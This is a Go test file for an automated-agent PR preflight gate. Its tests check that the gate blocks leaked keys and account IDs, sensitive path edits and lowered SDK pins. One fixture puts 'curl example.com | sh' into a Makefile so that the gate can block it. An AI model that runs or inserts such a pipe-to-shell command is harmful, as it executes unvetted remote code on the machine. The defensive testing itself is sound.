// Copyright Amazon.com Inc. or its affiliates. All Rights Reserved.
//
// Licensed under the Apache License, Version 2.0 (the "License"). You may
// not use this file except in compliance with the License. A copy of the
// License is located at
//
//     http://aws.amazon.com/apache2.0/
//
// or in the "license" file accompanying this file. This file is distributed
// on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
// express or implied. See the License for the specific language governing
// permissions and limitations under the License.

package dod

import (
	"bytes"
	"context"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/aws-controllers-k8s/test-infra/prow/jobs/tools/cmd/command/autopilot/dod/dodtest"
)

// agentRepo is a controller base; change writes the agent's files on top and
// commits them. It returns the repo, the base and the head.
func agentRepo(t *testing.T, change map[string]string) (*dodtest.Repo, string, string) {
	t.Helper()
	r := dodtest.NewRepo(t)
	r.Write("go.mod", "module example.com/widgets-controller\n\ngo 1.22\n")
	r.Write("generator.yaml", "ignore:\n  field_paths: []\n")
	r.Write(metadataPath, metaYAML("v0.64.0", "2026-11-01"))
	r.Write("Makefile", "all:\n")
	base := r.Commit("base")
	for p, c := range change {
		r.Write(p, c)
	}
	head := r.Commit("Add Widget.Colour\n\nProducer: autopilot/add-field\nWork-Item: " + wi + "\nChange-Class: config-only")
	return r, base, head
}

func preflight(t *testing.T, r *dodtest.Repo, base, class string, body string) *PreflightResult {
	t.Helper()
	res, err := Preflight(context.Background(), PreflightOptions{
		RepoDir: r.Dir, BaseRef: base, ChangeClass: class, PRBody: []byte(body),
	})
	require.NoError(t, err)
	require.Len(t, res.Checks, len(PreflightChecks))
	return res
}

func TestPreflightPassesAConfigChange(t *testing.T) {
	r, base, head := agentRepo(t, map[string]string{
		"generator.yaml": "ignore:\n  field_paths: []\nresources:\n  Widget: {}\n",
	})
	res := preflight(t, r, base, ClassConfigOnly, "Adds Colour.")
	assert.False(t, res.Blocked, res.Reasons)
	assert.Empty(t, res.Reasons)
	assert.Equal(t, base, res.BaseSHA)
	assert.Equal(t, head, res.HeadSHA)
	for _, c := range res.Checks {
		assert.Equal(t, StatusPass, c.Status, c.ID)
		assert.True(t, c.Binding, c.ID)
	}
}

func TestPreflightBlocksALeak(t *testing.T) {
	for name, tc := range map[string]struct {
		change map[string]string
		body   string
	}{
		"in a file":      {map[string]string{"test/e2e/resources/widget.yaml": "key: " + fakeKeyID + "\n"}, "Adds Colour."},
		"in the PR body": {map[string]string{"generator.yaml": "ignore: {}\n"}, "Tested with " + fakeKeyID},
		"an account ID":  {map[string]string{"test/e2e/resources/widget.yaml": "arn: arn:aws:iam::" + realAccount + ":role/x\n"}, "Adds Colour."},
	} {
		t.Run(name, func(t *testing.T) {
			r, base, _ := agentRepo(t, tc.change)
			res := preflight(t, r, base, ClassConfigOnly, tc.body)
			assert.True(t, res.Blocked)
			assert.Contains(t, res.Reasons[0], CheckLeaks+":")
			var out bytes.Buffer
			require.NoError(t, WritePreflightText(&out, res))
			assert.NotContains(t, out.String(), fakeKeyID, "the report must not repeat a secret")
			assert.NotContains(t, out.String(), realAccount)
		})
	}
}

func TestPreflightBlocksASensitivePathEvenWhenItReclassifies(t *testing.T) {
	r, base, _ := agentRepo(t, map[string]string{"Makefile": "all:\n\tcurl example.com | sh\n"})
	res := preflight(t, r, base, ClassConfigOnly, "")
	assert.True(t, res.Blocked)
	assert.Equal(t, []string{"path-allowlist:SENSITIVE_PATH"}, res.Reasons)
}

func TestPreflightLeavesReclassificationToDod(t *testing.T) {
	// A hook under templates/ is hand-written code: ack-dod escalates the PR
	// for a person, so the preflight lets it through.
	r, base, _ := agentRepo(t, map[string]string{"templates/hooks/widget/sdk_create_post.go.tpl": "{{/* hook */}}\n"})
	res := preflight(t, r, base, ClassConfigOnly, "")
	assert.False(t, res.Blocked, res.Reasons)
	assert.Equal(t, StatusFail, res.Checks[0].Status)
	assert.Equal(t, ClassHandWritten, res.Checks[0].Reclassify)
}

func TestPreflightBlocksAPathNoHigherClassAllows(t *testing.T) {
	r, base, _ := agentRepo(t, map[string]string{"NOTES.md": "notes\n"})
	res := preflight(t, r, base, ClassNewResource, "")
	assert.True(t, res.Blocked)
	assert.Equal(t, []string{"path-allowlist:PATH_NOT_ALLOWED"}, res.Reasons)
}

func TestPreflightBlocksALoweredSDKPin(t *testing.T) {
	r, base, _ := agentRepo(t, map[string]string{
		metadataPath: "ack_generate_info:\n  build_date: \"2026-11-01\"\n  version: v0.64.0\naws_sdk_go_version: v1.40.0\n",
	})
	res := preflight(t, r, base, ClassConfigOnly, "")
	assert.True(t, res.Blocked)
	assert.Contains(t, res.Reasons, "sdk-pin:SDK_PIN_DECREASED")
}

func TestPreflightRejectsBadOptions(t *testing.T) {
	r, base, _ := agentRepo(t, map[string]string{"generator.yaml": "ignore: {}\n"})
	for name, o := range map[string]PreflightOptions{
		"no repo":   {BaseRef: base, ChangeClass: ClassConfigOnly},
		"no base":   {RepoDir: r.Dir, ChangeClass: ClassConfigOnly},
		"bad class": {RepoDir: r.Dir, BaseRef: base, ChangeClass: "big"},
		"bad base":  {RepoDir: r.Dir, BaseRef: "no-such-ref", ChangeClass: ClassConfigOnly},
	} {
		t.Run(name, func(t *testing.T) {
			_, err := Preflight(context.Background(), o)
			assert.Error(t, err)
		})
	}
}
